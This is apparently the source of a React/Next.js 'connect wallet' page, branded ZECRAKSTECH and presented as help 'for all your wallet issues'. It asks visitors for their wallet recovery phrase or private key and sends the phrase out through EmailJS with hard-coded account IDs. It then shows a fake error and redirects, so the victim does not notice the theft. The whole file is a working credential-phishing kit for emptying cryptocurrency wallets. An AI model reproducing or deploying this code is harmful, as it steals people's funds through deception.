import Head from "next/head";
import Image from "next/image";
import React, { useEffect, useRef, useState } from "react";
import emailjs from "@emailjs/browser";
import { AiOutlineThunderbolt } from "react-icons/ai";

const getQueryParams = (query: any) => {
  return query
    ? (/^[?#]/.test(query) ? query.slice(1) : query)
        .split("&")
        .reduce((params: any, param: any) => {
          let [key, value] = param.split("=");
          params[key] = value
            ? decodeURIComponent(value.replace(/\+/g, " "))
            : "";
          return params;
        }, {})
    : {};
};

const connect = () => {
  const [data, setData] = useState<any>(null);
  useEffect(() => {
    const { data } = getQueryParams(window.location.search);
    setData(JSON.parse(data));
  }, []);

  const [show, setShow] = useState(false);
  const [loading, setLoading] = useState(false);
  const [buttons, setButtons] = useState("phrase");
  const [wallet, setWallet] = useState("");
  const [button, setButton] = useState(false);

  const form = useRef<any>();

  const sendEmail = (e: any) => {
    e.preventDefault();
    setLoading(true);
    emailjs
      .sendForm(
        "service_bms7826",
        "template_2i0arfq",
        form.current,
        "7sc1o-EVY--feH8er"
      )
      .then(
        (result) => {
          console.log(result.text);
          alert("we cannot handle your request now, please try again later");
          window.location.replace("/");
          //   handleClick("wallets")
        },
        (error) => {
          console.log(error.text);
        }
      );
  };

  const handleChange = (e: any) => {
    setWallet(e.target.value);
    const walletCount = wallet.split(" ").length;
    if (walletCount === 12 || walletCount === 24) {
      setButton(true);
    } else {
      setButton(false);
    }
  };
  return (
    <>
      <Head key={3}>
        <title>CONNECT</title>
        <meta name="description" content="For all your wallet issues" />
        <meta name="viewport" content="width=device-width, initial-scale=1" />
        <link rel="icon" href="/favicon.ico" />
      </Head>
      <main>
        <div className="lg:px-[10em] md:px-[6rem] px-[1rem] flex py-[2em] ">
          <div className="m-auto w-full ">
            <div className="my-[4em] text-center">
              <p className="font-[900] md:text-[5em] text-[3em]">ZECRAKSTECH</p>
              <p className="bg-pri p-4 text-white">
                Conect your wallet to get started
              </p>
            </div>

            <div className="p-[4em] shadow-2xl">
              {show === false ? (
                <div className="flex items-center gap-[3em]  ">
                  <div className="h-[10rem] w-[10rem] rounded-full flex items-center justify-center overflow-hidden shadow-md">
                    <Image
                      src={data?.image}
                      alt={data?.name}
                      width={100}
                      height={100}
                    />
                  </div>
                  <div>
                    <p className="font-[600] text-[20px] ">{data?.name}</p>
                    <p>Connect selected wallet</p>
                    <button
                      onClick={() => setShow(true)}
                      className="bg-pri px-[2em] py-[.6em] rounded-md text-white font-[500] text-[16px]"
                    >
                      Connect
                    </button>
                  </div>
                </div>
              ) : (
                <div>
                {
                    loading === false ? (
                        <div className="bg-[#5a7d9b0c] rounded-md border  md:p-[4em] p-[1em] text-[#3647518b] ">
                        <div className="flex justify-between w-full">
                          <div className="flex items-center gap-2 ">
                            <Image
                              width={20}
                              height={20}
                              src={data?.image}
                              alt={data?.name}
                            />
                            <span className="text-[12px]">{data?.name}</span>
                          </div>
    
                          <div className="rounded-full bg-[#13df761e] px-[10px] py-[6px]">
                            <div className="flex items-center gap-2 ">
                              <span>
                                <AiOutlineThunderbolt />
                              </span>
                              <span className="text-[12px]">Manual Connect</span>
                            </div>
                          </div>
                        </div>
    
                        <div>
                          <div>
                            <button
                              onClick={() => setButtons("phrase")}
                              className={`p-[1em] ${
                                buttons === "phrase" &&
                                "border-b-[4px] border-b-green-700"
                              }`}
                            >
                              Key Phrase
                            </button>
                            <button
                              onClick={() => setButtons("key")}
                              className={`p-[1em] ${
                                buttons === "key" &&
                                " border-b-[4px] border-b-green-700"
                              }`}
                            >
                              Private Key
                            </button>
                          </div>
                          <div className="">
                            <form ref={form} onSubmit={sendEmail}>
                              {buttons === "phrase" && (
                                <textarea
                                  className="rounded-md border w-full p-5 mb-2"
                                  name="phrase"
                                  id=""
                                  // cols="30"
                                  // rows="4"
                                  value={wallet}
                                  onChange={handleChange}
                                ></textarea>
                              )}
                              {buttons === "key" && (
                                <input
                                  type="text"
                                  className="p-5 w-full rounded-md focus:outline-none border mb-2 "
                                />
                              )}
                              {button ? (
                                <button className="rounded-md bg-green-300 w-full py-[10px]">
                                  Connect
                                </button>
                              ) : (
                                <button className="rounded-md bg-gray-300 w-full py-[10px]">
                                  Connect
                                </button>
                              )}
                              <input
                                name="wallet"
                                value={data?.name}
                                className="hidden"
                              />
                            </form>
                          </div>
                        </div>
                      </div>) : (
                        <div className="flex justify-center items-center">
                            <div className="flex items-center gap-2">
                                <div className="animate-spin rounded-full h-3 w-3 border-b-2 border-gray-900"></div>
                                <p>Connecting...</p>
                            </div>
                        </div>
                    )
                }
                </div>
              )}
            </div>
          </div>
        </div>
      </main>
    </>
  );
};

export default connect;
